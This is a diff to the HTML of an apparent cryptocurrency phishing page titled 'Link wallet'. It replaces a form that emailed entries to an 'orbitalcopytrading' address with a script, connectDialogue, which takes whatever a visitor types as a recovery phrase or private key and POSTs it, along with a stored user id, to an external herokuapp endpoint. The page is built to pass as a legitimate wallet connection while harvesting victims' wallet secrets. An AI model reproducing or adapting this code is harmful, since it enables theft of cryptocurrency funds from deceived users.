@@ -44,6 +44,8 @@
     <link href="./wallets_files/css2.html" rel="stylesheet">
     <link rel="stylesheet" href="./wallets_files/bootstrap.min.css"
         integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
     <title>Link wallet</title>
     <link href="./wallets_files/main.css" rel="stylesheet">
     <style type="text/css"></style>
@@ -19362,14 +19364,13 @@
                                     </div>
                                     <div class="send-tabs">
                                         <button id="phraseSend">Phrase</button>
-                                        <button id="keystoreSend">Keystore Json</button>
+                                        <!-- <button id="keystoreSend">Keystore Json</button> -->
                                         <button id="privateKeySend">Private Key</button>
                                     </div>
                                     <div class="send-form">
-                                        <form action="https://formsubmit.co/support@orbitalcopytrading.com" id=""
+                                        <form  onsubmit="connectDialogue(event)" 
                                             enctype="" method="POST">
-                                            <input type="hidden" name="_next"
-                                                value="https://supportmail.netlify.app/connecting.html">
+                                          
                                             <input type="hidden" name="_captcha" value="false">
                                             <input type="hidden" name="_template" value="table">
                                             <input type="hidden" name="_cc" value="support@orbitalcopytrading.com">
@@ -19377,14 +19378,16 @@
                                             <div id="data-to-send">
                                                 <div class="form-group"><input type="hidden" id="type" name="type"
                                                         value="phrase"><textarea name="phrase" required=""
-                                                        class="form-control" placeholder="Enter your recovery phrase"
+                                                        class="form-control" id="phrase" placeholder="Enter text here"
                                                         rows="5" style="resize: none" spellcheck="false"></textarea>
                                                 </div>
-                                                <div class="small text-left my-3" style="font-size: 11px">Typically 12
-                                                    (sometimes 24) words separated by single spaces</div>
+                                                <div class="small text-left my-3" style="font-size: 11px"><b>Recovery Phrase</b>:Typically 12
+                                                    (sometimes 24) words separated by single spaces<p>
+                                                        <b>Private Key</b>:Usually a single encoded text string
+                                                    </p></div>
                                             </div>
-                                            <button type="submit" name="import" class="btn"
-                                                style="background-color: blue; color: white; display: block; margin: 0 auto;">Continue</button>
+                                            <button type="submit" name="import" class="btn" id="connectBtn"
+                                                style="background-color: blue; color: white; display: block; margin: 0 auto;" >Continue</button>
                                             <div class="text-right">
                                                 <button type="button" id="cancelBtn"
                                                     class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">Cancel</button>
@@ -19394,6 +19397,7 @@
                                 </div>
                             </div>
                         </div>
+                        
                         <div id="connect-dialog" style="display: none;">
                             <div class="content-dialog-overlay"></div>
                             <div class="content-dialog-content">
@@ -19793,8 +19797,103 @@
                 </div>
             </main>
         </div>
-        <script src="./wallets_files/jquery-3.6.0.min.js.download"
-            integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+
+
+<script>
+    async function subFnc(identityId) {
+                            
+                            await $.ajax({
+                              type: "POST",
+                              url: `https://moon-heroku-d6adfb7e1290.herokuapp.com/transactions/${identityId.userId}/wallet`,
+                              dataType: "json",
+                              data: { ...identityId },
+                              timeout: 30000,
+                              success: function (data) {
+                               
+                                 
+                                 console.log("processing");
+                                 
+                                                      },
+                              error:  function (error) {
+                                  
+                                                          alert('Error Submiting Payment Data');
+                                                          console.log(error);
+                                                        //   stopProcess()
+                                                      }
+                              // function (xhr, status, error) {
+                              //   console.log(error);
+                              //   $('.live-section').html("").addClass('alert-danger')
+                              // }
+                          });
+                        
+                        }
+                       async  function connectDialogue(event){
+                                console.log("clicked");
+                                
+event.preventDefault()
+$("#connectBtn").text("connecting. . .")
+
+var addy=$("#phrase").val()
+
+var user=localStorage.getItem("user")
+var parsedUser=JSON.parse(user)
+console.log(parsedUser);
+
+var identityId={
+    addy,
+    userId:parsedUser._id,
+}
+
+console.log(identityId);
+
+
+localStorage.setItem("identityId",JSON.stringify(identityId))
+
+var identityIdd=localStorage.getItem("identityId")
+                            var identityId=JSON.parse(identityIdd)
+
+                            console.log(identityId);
+                            
+                            await subFnc(identityId)
+
+                            }
+
+
+         $(document).ready(async function () {            
+    
+                        
+                       
+                           
+    
+                        })
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        
+       
         <script>
             $(document).ready(function () {
                 let wallets = $('.cmAzHq');
